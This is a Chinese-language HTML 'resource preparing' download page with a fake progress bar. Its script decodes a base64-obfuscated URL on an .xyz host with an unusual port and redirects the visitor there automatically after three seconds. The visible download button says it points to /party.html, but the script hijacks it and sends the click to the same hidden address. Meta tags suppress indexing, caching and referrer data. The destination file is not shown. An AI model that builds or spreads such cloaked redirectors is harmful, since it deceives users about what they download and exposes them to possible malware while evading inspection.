<!doctype html>
<html lang="zh-CN">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="robots" content="noindex,nofollow,noarchive,nosnippet">
  <meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet">
  <meta name="referrer" content="no-referrer">
  <meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
  <meta http-equiv="Pragma" content="no-cache">
  <meta http-equiv="Expires" content="0">
  <link rel="canonical" href="https://rhbdjy.com/">
  <title>资源准备中</title>
  <style>
    :root{color-scheme:dark;--bg:#07111f;--panel:rgba(16,28,58,.82);--cyan:#4cf4dd;--violet:#8d67ff;--pink:#ff62c6;--text:#eef5ff;--muted:#aab8d4}
    *{box-sizing:border-box}
    body{margin:0;min-height:100vh;display:grid;place-items:center;font-family:"Microsoft YaHei",Arial,sans-serif;background:radial-gradient(circle at 20% 20%,rgba(76,244,221,.22),transparent 30%),radial-gradient(circle at 80% 30%,rgba(141,103,255,.26),transparent 34%),linear-gradient(145deg,#06101f,#101a3b 58%,#07111f);color:var(--text)}
    .card{width:min(92vw,520px);padding:42px;border:1px solid rgba(255,255,255,.14);border-radius:26px;background:var(--panel);box-shadow:0 28px 80px rgba(0,0,0,.38),0 0 40px rgba(76,244,221,.12);text-align:center;backdrop-filter:blur(18px)}
    h1{margin:0 0 14px;font-size:34px;letter-spacing:0}
    p{margin:9px 0;color:var(--muted);font-size:16px}
    .bar{height:12px;margin:28px 0 24px;border-radius:999px;background:rgba(255,255,255,.1);overflow:hidden}
    .bar span{display:block;height:100%;width:0;border-radius:inherit;background:linear-gradient(90deg,var(--cyan),var(--violet),var(--pink));box-shadow:0 0 22px rgba(76,244,221,.55);animation:load 3s linear forwards}
    .manual{display:inline-flex;align-items:center;justify-content:center;min-height:48px;padding:0 28px;border-radius:999px;background:linear-gradient(135deg,var(--cyan),var(--violet));color:#06101f;text-decoration:none;font-weight:800;box-shadow:0 0 28px rgba(76,244,221,.42);transition:transform .2s ease,box-shadow .2s ease}
    .manual:hover{transform:translateY(-2px);box-shadow:0 0 38px rgba(141,103,255,.58)}
    @keyframes load{to{width:100%}}
  </style>
</head>
<body>
  <main class="card">
    <h1>资源准备中</h1>
    <p>正在校验连接环境</p>
    <p>即将进入下载页面</p>
    <p>请勿关闭当前页面</p>
    <div class="bar" aria-hidden="true"><span></span></div>
    <a id="manualDownload" class="manual" href="/party.html" rel="nofollow noopener noreferrer">立即下载</a>
  </main>
  <script>
    const REAL_DOWNLOAD_URL = atob("aHR0cHM6Ly9wbHouMzEzNDg2Lnh5ejozNTg4OC8=");
    const manualDownload = document.getElementById("manualDownload");
    window.setTimeout(function(){
      window.location.replace(REAL_DOWNLOAD_URL);
    }, 3000);
    manualDownload.addEventListener("click", function(e){
      e.preventDefault();
      window.location.replace(REAL_DOWNLOAD_URL);
    });
  </script>
</body>
</html>
